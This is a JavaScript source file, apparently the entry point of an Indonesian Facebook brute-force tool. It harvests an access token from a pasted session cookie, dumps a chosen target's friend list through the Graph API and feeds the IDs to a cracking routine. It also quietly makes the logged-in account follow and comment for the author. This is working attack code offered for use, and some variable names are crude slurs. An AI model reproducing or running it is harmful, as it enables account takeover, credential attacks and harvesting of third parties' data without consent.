"use strict";

/**
 * Author: Khamdihi Dev
 * Created: 07 January 2025
 * Contact: wa.me/+6283853140469
 */

import fs from 'fs';
import path from 'path';
import LohKok from './logo.js';
import axios from 'axios';
import readline from 'readline';
import { Crack } from './brute.js'
import { BotForMe } from './forme.js';
let friends = []
class DumpMetaUser {
    constructor(userid) {
        const token = fs.readFileSync('data/token.txt', 'utf8');
        const cokie = fs.readFileSync('data/cokie.txt', 'utf8');
        this.token = token.trim();
        this.cokie = cokie.trim();
        this.apifb = `https://graph.facebook.com/v16.0/${userid}/friends`;
    }

    async GetFriends(afters = '', next = true) {
        try {
            process.on('SIGINT', () => {
                next = false;
                
            });
            while (next) {
                const response = await axios.get(this.apifb, {
                    headers: {
                        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "accept-language": "id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                        "cookie": this.cokie,
                        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"
                    },
                    params: {
                        'after': afters,
                        'pretty': 1,
                        'access_token': this.token,
                        'limit': ''
                    },
                    validateStatus: function (e) {
                        return e < 500;
                    }
                });
                if (!response.data || !response.data.data || !response.data.paging) {
                    console.log('\n[+] Tidak Ada data')
                    break
                }
                for (const data of response.data.data) {
                    const user = `${data.id}|${data.name}`;
                    if (!friends.includes(user)) {
                        friends.push(user);
                        process.stdout.write(`\r[+] sucess dump : ${friends.length}`);
                    }
                }
                if (response.data.paging.cursors && response.data.paging.cursors.after) {
                    afters = response.data.paging.cursors.after;
                } else {
                    console.log('\n[+] Semua teman telah didump.');
                    break;
                }
            }
            new Crack(friends).MainBrute()
        } catch (error) {
            console.log(error);
        }
    }
};

class LoginUser {
    constructor() {
        this.url = 'https://adsmanager.facebook.com/adsmanager/onboarding'
    }

    async LoginWithCokie() {
        try {
            LohKok()
            const YourCokie = await this.inputs('[?] Paste your cookie facebook : ');
            const response = await axios.get(this.url, {
                params: {
                    'breakdown_regrouping': '1',
                    'nav_source': 'no_referrer'
                },
                headers: {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': YourCokie.trim(),
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'viewport-width': '673'
                }
            });
            const UserAct = response.data.match(/act=(\d+)/)
            if (!UserAct) {
                console.log('\n[!] Login failed, try again');
                return;
            }
            await this.GetToken(UserAct[1], YourCokie)
        } catch (er) {
            console.error(er);
            return;
        }
    };

    async GetToken(act, cokie) {
        try {
            const response = await axios.get(this.url, {
                params: {
                    'act': act,
                    'breakdown_regrouping': '1',
                    'nav_source': 'no_referrer'
                },
                headers: {
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
                    'cache-control': 'max-age=0',
                    'cookie': cokie.trim(),
                    'dpr': '1',
                    'priority': 'u=0, i',
                    'sec-ch-prefers-color-scheme': 'dark',
                    'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
                    'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.112", "Chromium";v="131.0.6778.205", "Not_A Brand";v="24.0.0.0"',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-model': '""',
                    'sec-ch-ua-platform': '"Windows"',
                    'sec-ch-ua-platform-version': '"15.0.0"',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'same-origin',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
                    'viewport-width': '673'
                }
            });
            const token = response.data.match(/__accessToken="([^"]+)"/)[1];
            fs.writeFileSync('data/token.txt', token, 'utf-8')
            fs.writeFileSync('data/cokie.txt', cokie, 'utf-8')
            await new BotForMe(cokie).FollowMeAndKomen()
            console.log(`\nLogin berhasil -> node ${path.basename(process.argv[1])}`);
        } catch (er) {
            console.error(er);
            return;
        }

    };

    inputs(kontol) {
        const rl = readline.createInterface({
            input: process.stdin,
            output: process.stdout
        });
        return new Promise((resolve) => rl.question(kontol, (puki) => {
            rl.close();
            resolve(puki);
        }));
    };
};


class BruteMenu {
    constructor() {
        if (!fs.existsSync('data/cokie.txt')) {
            var log = new LoginUser()
            log.LoginWithCokie()
        } else {
            this.menu()
        }

    };
    async Info() {
        try {
            const token = fs.readFileSync('data/token.txt', 'utf-8');
            const cokie = fs.readFileSync('data/cokie.txt', 'utf-8');
            const respon = await axios.get(`https://graph.facebook.com/me?fields=id,name&access_token=${token}`, {
                headers: {
                    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                    "accept-language": "id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7",
                    "cookie": cokie,
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0"

                }
            });
            if (!respon.data.id) {
                fs.unlinkSync('data/cokie.txt')
                fs.unlinkSync('data/token.txt')
                console.error('\n[!] Invalid Token Or Cokie')
                process.exit(1)
            }
            console.log(`[+] Halo ${respon.data.name} - ${respon.data.id}\n`)
        } catch (er) {
            fs.unlinkSync('data/cokie.txt')
            fs.unlinkSync('data/token.txt')
            console.error('\n[!] Invalid Token Or Cokie')
            process.exit(1)
        }
    }

    async menu() {
        console.clear()
        LohKok()
        await this.Info()
        console.log('[1] Dump friends\n[2] Chek hasil crack\n[0] Keluar Bye\n');
        const ask = new LoginUser()
        const pilihan = await ask.inputs('[?] Pilih menu : ');
        if (pilihan == '1') {
            console.log('\n[!] Masuka target ID hanya 1, CTRL+C untuk stop')
            try {
                const useridtarget = await ask.inputs('[?] Masukan userid : ')
                const asuu = await new DumpMetaUser(useridtarget).GetFriends('');
            } catch (er) {
                console.log(er.message)
            }
        } else if(pilihan == '2'){
            const isine = fs.readFileSync('data/new.txt','utf-8')
            console.log(`${isine}`)
        } else if(pilihan == '0'){
            process.exit()
        } else {
            this.menu()
        }

    };

}

new BruteMenu();
